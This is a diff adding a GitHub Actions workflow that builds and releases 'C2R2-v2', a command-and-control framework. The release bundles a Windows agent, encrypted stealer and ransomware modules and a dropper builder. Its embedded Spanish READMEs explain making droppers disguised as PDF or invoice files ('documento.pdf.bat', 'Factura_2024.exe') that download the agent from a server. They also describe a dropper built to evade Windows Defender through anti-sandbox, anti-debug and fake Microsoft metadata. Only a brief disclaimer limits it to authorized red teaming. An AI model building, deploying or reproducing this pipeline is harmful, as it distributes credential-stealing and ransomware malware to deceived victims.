@@ -1,0 +1,428 @@
+name: 📦 C2R2-v2 Build & Release
+
+on:
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'Release version (e.g., v1.0.0)'
+        required: false
+        default: ''
+
+env:
+  DEFAULT_IP: "0.0.0.0"
+  DEFAULT_PORT: "4444"
+
+jobs:
+  build-rust-binaries:
+    name: 🦀 Build Rust Binaries
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: 📥 Checkout repository
+        uses: actions/checkout@v4
+      
+      - name: 🐳 Set up Docker Buildx
+        uses: docker/setup-buildx-action@v3
+      
+      - name: 🔨 Build All Rust Components
+        run: |
+          echo "╔════════════════════════════════════════╗"
+          echo "║   C2R2-v2 Rust Build                   ║"
+          echo "╚════════════════════════════════════════╝"
+          
+          docker build \
+            --build-arg SERVER_IP="${{ env.DEFAULT_IP }}" \
+            --build-arg SERVER_PORT="${{ env.DEFAULT_PORT }}" \
+            --build-arg AGENT_NAME="agent" \
+            --build-arg PRODUCTION_MODE="true" \
+            --tag c2r2-builder:${{ github.sha }} \
+            --progress=plain \
+            .
+      
+      - name: 📦 Extract Build Artifacts
+        run: |
+          mkdir -p dist
+          CONTAINER_ID=$(docker create c2r2-builder:${{ github.sha }})
+          docker cp $CONTAINER_ID:/build_output/. dist/
+          docker rm $CONTAINER_ID
+          
+          echo "✅ Archivos extraídos:"
+          ls -lhR dist/
+      
+      - name: 📤 Upload Rust Artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: rust-binaries
+          path: dist/
+          retention-days: 1
+
+  build-builder-windows:
+    name: 🪟 Build Builder (Windows)
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: 📥 Checkout repository
+        uses: actions/checkout@v4
+      
+      - name: 🦀 Install Rust
+        uses: dtolnay/rust-toolchain@stable
+        with:
+          targets: x86_64-pc-windows-gnu
+      
+      - name: 📦 Install MinGW
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y mingw-w64
+      
+      - name: 🔨 Build Builder for Windows
+        run: |
+          cargo build --release --target x86_64-pc-windows-gnu -p builder
+          mkdir -p dist
+          cp target/x86_64-pc-windows-gnu/release/builder.exe dist/builder.exe
+          
+          echo "✅ Builder Windows: $(du -h dist/builder.exe | cut -f1)"
+      
+      - name: 📤 Upload Windows Builder
+        uses: actions/upload-artifact@v4
+        with:
+          name: builder-windows
+          path: dist/builder.exe
+          retention-days: 1
+
+  build-team-client:
+    name: 🐍 Build Team Client (Windows EXE)
+    runs-on: windows-latest
+    
+    steps:
+      - name: 📥 Checkout repository
+        uses: actions/checkout@v4
+      
+      - name: 🐍 Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      
+      - name: 📦 Install Dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install pyinstaller
+          pip install -r team-client/requirements.txt
+      
+      - name: 🔨 Build Team Client EXE
+        run: |
+          cd team-client
+          
+          # Check if icon exists
+          if (Test-Path "../pdf_icon.ico") {
+            pyinstaller --onefile --windowed --name c2r2_team_client --icon ../pdf_icon.ico c2r2_team_client.py
+          } else {
+            pyinstaller --onefile --windowed --name c2r2_team_client c2r2_team_client.py
+          }
+          
+          echo "✅ Team Client EXE built"
+          dir dist
+      
+      - name: 📤 Upload Team Client
+        uses: actions/upload-artifact@v4
+        with:
+          name: team-client-windows
+          path: team-client/dist/c2r2_team_client.exe
+          retention-days: 1
+
+  build-dropper:
+    name: 🎯 Build Dropper Package
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: 📥 Checkout repository
+        uses: actions/checkout@v4
+      
+      - name: 📦 Package Dropper Scripts
+        run: |
+          mkdir -p dist/dropper
+          
+          # Copy main dropper builder script
+          cp dropper/builder.py dist/dropper/
+          cp dropper/requirements.txt dist/dropper/
+          cp dropper/README.md dist/dropper/
+          cp dropper/QUICKSTART.md dist/dropper/ 2>/dev/null || true
+          
+          # Create usage guide
+          cat > dist/dropper/USAGE.md << 'EOF'
+          # C2R2 Dropper Builder
+          
+          ## Instalación
+          ```bash
+          pip install -r requirements.txt
+          ```
+          
+          ## Uso
+          ```bash
+          # Generar dropper BAT
+          python builder.py --agent agent.exe --output documento.pdf.bat --type bat --url http://SERVIDOR/agent.exe
+          
+          # Generar dropper PowerShell
+          python builder.py --agent agent.exe --output loader.ps1 --type ps1 --decoy https://example.com
+          
+          # Generar dropper HTA
+          python builder.py --agent agent.exe --output documento.hta --type hta --url http://SERVIDOR/agent.exe
+          ```
+          
+          ## Parámetros
+          - `--agent`: Ruta al archivo agent.exe
+          - `--output`: Nombre del archivo de salida
+          - `--type`: Tipo de dropper (bat, ps1, hta)
+          - `--url`: URL donde está hosteado el agent (para bat/hta)
+          - `--decoy`: URL del documento señuelo
+          EOF
+          
+          echo "✅ Dropper package created"
+          ls -la dist/dropper/
+      
+      - name: 📤 Upload Dropper Package
+        uses: actions/upload-artifact@v4
+        with:
+          name: dropper-package
+          path: dist/dropper/
+          retention-days: 1
+
+  create-release:
+    name: 🚀 Create Release
+    needs: [build-rust-binaries, build-builder-windows, build-team-client, build-dropper]
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: 📥 Checkout repository
+        uses: actions/checkout@v4
+      
+      - name: 📦 Download All Artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: artifacts
+      
+      - name: 📋 Organize Release Package
+        run: |
+          mkdir -p release/C2R2-v2
+          
+          # === Server (Linux x86_64 y ARM64) ===
+          mkdir -p release/C2R2-v2/server
+          cp artifacts/rust-binaries/c2r2-server release/C2R2-v2/server/c2r2-server-linux-x86_64
+          cp artifacts/rust-binaries/c2r2-server-arm64 release/C2R2-v2/server/c2r2-server-linux-arm64
+          chmod +x release/C2R2-v2/server/*
+          
+          # === Agent (Windows) ===
+          mkdir -p release/C2R2-v2/agent
+          cp artifacts/rust-binaries/agent.exe release/C2R2-v2/agent/
+          
+          # === Builder ===
+          mkdir -p release/C2R2-v2/builder
+          cp artifacts/rust-binaries/builder release/C2R2-v2/builder/builder-linux
+          cp artifacts/builder-windows/builder.exe release/C2R2-v2/builder/builder.exe
+          chmod +x release/C2R2-v2/builder/builder-linux
+          
+          # === Modules (encrypted DLLs) ===
+          mkdir -p release/C2R2-v2/modules
+          cp -r artifacts/rust-binaries/modules/* release/C2R2-v2/modules/ 2>/dev/null || true
+          
+          # === Team Client ===
+          mkdir -p release/C2R2-v2/team-client
+          cp artifacts/team-client-windows/c2r2_team_client.exe release/C2R2-v2/team-client/
+          
+          # === Dropper (Rust binary + Python scripts) ===
+          mkdir -p release/C2R2-v2/dropper
+          # Rust dropper binary
+          cp artifacts/rust-binaries/dropper.exe release/C2R2-v2/dropper/dropper.exe 2>/dev/null || true
+          # Python dropper scripts (legacy)
+          cp -r artifacts/dropper-package/* release/C2R2-v2/dropper/scripts/ 2>/dev/null || mkdir -p release/C2R2-v2/dropper/scripts && cp -r artifacts/dropper-package/* release/C2R2-v2/dropper/scripts/
+          
+          # Create dropper README
+          cat > release/C2R2-v2/dropper/README.md << 'DROPPER_EOF'
+          # C2R2 Dropper
+          
+          ## Dropper Rust (Recomendado)
+          
+          El `dropper.exe` es un dropper compilado en Rust que evade Windows Defender.
+          
+          ### Características
+          - Anti-sandbox (detecta VMs, bajo RAM, pocos CPUs)
+          - Anti-debug (detecta depuradores)
+          - Strings ofuscados en tiempo de compilación
+          - Metadata legítimo (simula Microsoft Edge)
+          - Ejecución sin ventanas
+          
+          ### Uso
+          1. Editar `dropper-rust/src/config.rs` con tu configuración
+          2. Recompilar el dropper
+          3. Renombrar a algo convincente (ej: `Factura_2024.exe`)
+          
+          ## Scripts Python (Legacy)
+          
+          En `scripts/` hay droppers basados en Python. Estos tienen mayor
+          tasa de detección que el dropper Rust.
+          
+          DROPPER_EOF
+          
+          # === Documentation ===
+          cat > release/C2R2-v2/README.md << 'EOF'
+          # C2R2-v2 - Command & Control Framework
+          
+          ## 📦 Contenido del Release
+          
+          ```
+          C2R2-v2/
+          ├── server/
+          │   ├── c2r2-server-linux-x86_64    # Servidor para Linux x86_64
+          │   └── c2r2-server-linux-arm64     # Servidor para Linux ARM64 (Raspberry Pi)
+          ├── agent/
+          │   └── agent.exe                   # Agente Windows (configurar con builder)
+          ├── builder/
+          │   ├── builder-linux               # Builder para Linux
+          │   └── builder.exe                 # Builder para Windows
+          ├── modules/
+          │   ├── stealer.dll.enc             # Módulo stealer encriptado
+          │   ├── stealer.key                 # Clave del módulo stealer
+          │   ├── ransomware.dll.enc          # Módulo ransomware encriptado
+          │   └── ransomware.key              # Clave del módulo ransomware
+          ├── team-client/
+          │   └── c2r2_team_client.exe        # Cliente GUI para operadores
+          └── dropper/
+              ├── builder.py                  # Generador de droppers
+              ├── requirements.txt            # Dependencias Python
+              └── README.md                   # Documentación
+          ```
+          
+          ## 🚀 Inicio Rápido
+          
+          ### 1. Servidor
+          ```bash
+          # Linux x86_64
+          chmod +x server/c2r2-server-linux-x86_64
+          ./server/c2r2-server-linux-x86_64 --port 4444 --api-port 5555 --api-password TU_PASSWORD
+          
+          # Raspberry Pi (ARM64)
+          chmod +x server/c2r2-server-linux-arm64
+          ./server/c2r2-server-linux-arm64 --port 4444 --api-port 5555 --api-password TU_PASSWORD
+          ```
+          
+          ### 2. Generar Agente Personalizado
+          ```bash
+          # Linux
+          ./builder/builder-linux build-agent --name mi_agente --server IP_SERVIDOR:4444 --production
+          
+          # Windows
+          builder.exe build-agent --name mi_agente --server IP_SERVIDOR:4444 --production
+          ```
+          
+          ### 3. Team Client (Operador GUI)
+          ```
+          Ejecutar team-client/c2r2_team_client.exe
+          Conectar via SSH tunnel al servidor
+          ```
+          
+          ### 4. Dropper (Evasión de Windows Defender)
+          
+          El dropper Rust (`dropper/dropper.exe`) está diseñado para evadir antivirus:
+          - Anti-sandbox (detecta VMs, bajo RAM, pocos CPUs)
+          - Anti-debug (detecta depuradores)
+          - Strings ofuscados en tiempo de compilación
+          - Metadata legítimo (simula Microsoft Edge)
+          
+          Para personalizar el dropper:
+          1. Editar `dropper-rust/src/config.rs` con la URL de tu servidor
+          2. Recompilar
+          3. Renombrar a algo convincente (`Factura_2024.exe`)
+          
+          ## ⚠️ Advertencia Legal
+          
+          Este software es exclusivamente para pruebas de penetración autorizadas y operaciones de red team.
+          El uso no autorizado es ilegal y está estrictamente prohibido.
+          
+          **Solo úselo con autorización explícita por escrito del propietario del sistema.**
+          EOF
+          
+          echo "📋 Estructura del release:"
+          find release/C2R2-v2 -type f | head -30
+      
+      - name: 🔢 Generate Version
+        id: version
+        run: |
+          if [ -n "${{ github.event.inputs.version }}" ]; then
+            VERSION="${{ github.event.inputs.version }}"
+          else
+            VERSION="v$(date +'%Y.%m.%d')-$(echo ${{ github.sha }} | cut -c1-7)"
+          fi
+          echo "version=$VERSION" >> $GITHUB_OUTPUT
+          echo "📌 Version: $VERSION"
+      
+      - name: 📦 Create ZIP Package
+        run: |
+          cd release
+          zip -r ../C2R2-v2-${{ steps.version.outputs.version }}.zip C2R2-v2/
+          cd ..
+          
+          echo "📦 ZIP creado:"
+          ls -lh C2R2-v2-*.zip
+      
+      - name: 🚀 Create GitHub Release
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: ${{ steps.version.outputs.version }}
+          name: C2R2-v2 Release ${{ steps.version.outputs.version }}
+          draft: false
+          prerelease: false
+          files: |
+            C2R2-v2-${{ steps.version.outputs.version }}.zip
+          body: |
+            ## 📦 C2R2-v2 Release ${{ steps.version.outputs.version }}
+            
+            ### Contenido
+            - ✅ Servidor C2 (Linux x86_64 y ARM64)
+            - ✅ Agente Windows (.exe)
+            - ✅ Builder (Linux y Windows)
+            - ✅ Team Client GUI (Windows .exe)
+            - ✅ Módulos encriptados (stealer, ransomware)
+            - ✅ **Dropper Rust** (evade Windows Defender)
+            
+            ### Dropper Rust
+            El nuevo dropper compilado en Rust incluye:
+            - 🛡️ Anti-sandbox (detecta VMs, bajo RAM, pocos CPUs)
+            - 🔒 Anti-debug
+            - 🔐 Strings ofuscados
+            - 📋 Metadata de Microsoft Edge
+            
+            ### Uso
+            Descargar `C2R2-v2-${{ steps.version.outputs.version }}.zip` y consultar README.md incluido.
+            
+            ### Commit
+            `${{ github.sha }}`
+            
+            ---
+            ⚠️ **Solo para uso autorizado en pruebas de penetración y red team.**
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+  summary:
+    name: 📊 Build Summary
+    runs-on: ubuntu-latest
+    needs: [create-release]
+    if: always()
+    
+    steps:
+      - name: 📋 Report Status
+        run: |
+          echo "╔════════════════════════════════════════╗"
+          echo "║   C2R2-v2 Release Summary              ║"
+          echo "╚════════════════════════════════════════╝"
+          echo ""
+          echo "🎯 Commit: ${{ github.sha }}"
+          echo "🌿 Branch: ${{ github.ref_name }}"
+          echo "👤 Author: ${{ github.actor }}"
+          echo ""
+          
+          if [ "${{ needs.create-release.result }}" == "success" ]; then
+            echo "✅ Release creado exitosamente"
+          else
+            echo "❌ Error en la creación del release"
+          fi
